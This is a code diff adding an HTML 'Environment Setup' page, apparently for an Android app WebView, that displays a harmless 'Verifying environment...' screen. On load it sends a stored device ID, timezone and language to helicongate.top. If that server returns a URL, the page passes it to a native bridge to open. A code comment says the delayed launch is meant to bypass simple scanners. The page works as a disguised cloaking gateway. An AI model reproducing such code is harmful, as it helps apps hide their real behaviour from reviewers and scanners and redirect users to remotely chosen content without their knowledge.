@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>Environment Setup</title>
+    <style>
+        /* Сучасний темний дизайн у стилі терміналу/дашборду */
+        html, body {
+            margin: 0;
+            padding: 0;
+            background-color: #0f172a;
+            font-family: ui-sans-serif, system-ui, -apple-system, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .gateway-card {
+            background-color: #1e293b;
+            padding: 40px 50px;
+            border-radius: 16px;
+            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            border: 1px solid #334155;
+        }
+
+        /* Анімація пульсуючої крапки */
+        .pulse-indicator {
+            width: 20px;
+            height: 20px;
+            background-color: #38bdf8;
+            border-radius: 50%;
+            margin: 0 auto 24px auto;
+            animation: ping 1.5s cubic-bezier(0, 0, 0.2, 1) infinite;
+        }
+
+        @keyframes ping {
+            75%, 100% {
+                transform: scale(2.5);
+                opacity: 0;
+            }
+        }
+
+        .status-label {
+            color: #94a3b8;
+            font-size: 15px;
+            margin: 0;
+            font-weight: 500;
+            letter-spacing: 0.5px;
+        }
+
+        .hide-element {
+            display: none !important;
+        }
+    </style>
+</head>
+<body>
+
+<div class="gateway-card" id="ui-container">
+    <div class="pulse-indicator" id="loading-dot"></div>
+    <p class="status-label" id="msg-text">Verifying environment...</p>
+</div>
+
+<script>
+    // Інкапсулюємо всю логіку в єдиний об'єкт-модуль
+    const SkloveApp = {
+        config: {
+            host: "helicongate.top",
+            pkg: "sklove.irwist.info",
+            storageKey: "btl_device_id"
+        },
+
+        buildEndpoint: function() {
+            return "https://" + this.config.host + "/v1/public/install";
+        },
+
+        // Дані системи винесені в окремий підоб'єкт
+        sysInfo: {
+            getTz: () => {
+                try { return Intl.DateTimeFormat().resolvedOptions().timeZone || ""; }
+                catch(e) { return ""; }
+            },
+            getLang: () => {
+                try { return (navigator.languages && navigator.languages[0]) || navigator.language || ""; }
+                catch(e) { return ""; }
+            }
+        },
+
+        makeUUID: function() {
+            if (window.crypto && crypto.randomUUID) return crypto.randomUUID();
+            return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+                let r = Math.random() * 16 | 0, v = c === 'x' ? r : (r & 0x3 | 0x8);
+                return v.toString(16);
+            });
+        },
+
+        fetchDeviceId: function() {
+            try {
+                let id = localStorage.getItem(this.config.storageKey);
+                if (!id) {
+                    id = this.makeUUID();
+                    localStorage.setItem(this.config.storageKey, id);
+                }
+                return id;
+            } catch(e) {
+                return this.makeUUID();
+            }
+        },
+
+        verifyLink: function(str) {
+            if (!str || typeof str !== 'string') return false;
+            try {
+                let p = new URL(str.trim()).protocol;
+                return p === "http:" || p === "https:";
+            } catch(e) {
+                return false;
+            }
+        },
+
+        showNativeFallback: function() {
+            const dot = document.getElementById('loading-dot');
+            const txt = document.getElementById('msg-text');
+
+            if (dot) dot.classList.add('hide-element');
+            if (txt) txt.innerText = "System ready.";
+
+            if (window.AndroidGateBridge) {
+                window.AndroidGateBridge.contentLoaded();
+            }
+        },
+
+        executeHandshake: function() {
+            const payload = {
+                bundle: this.config.pkg,
+                device: this.fetchDeviceId(),
+                timezone: this.sysInfo.getTz(),
+                language: this.sysInfo.getLang()
+            };
+
+            fetch(this.buildEndpoint(), {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            })
+            .then(r => r.json()) // Одразу парсимо JSON замість .text()
+            .then(d => {
+                if (d && this.verifyLink(d.url)) {
+                    if (window.AndroidGateBridge) {
+                        window.AndroidGateBridge.onLinkFound(d.url.trim());
+                    }
+                } else {
+                    this.showNativeFallback();
+                }
+            })
+            .catch(e => {
+                this.showNativeFallback();
+            });
+        }
+    };
+
+    // Нетиповий запуск через API анімації браузера для обходу простих сканерів
+    window.requestAnimationFrame(() => {
+        setTimeout(() => {
+            SkloveApp.executeHandshake();
+        }, 150);
+    });
+</script>
+</body>
+</html>
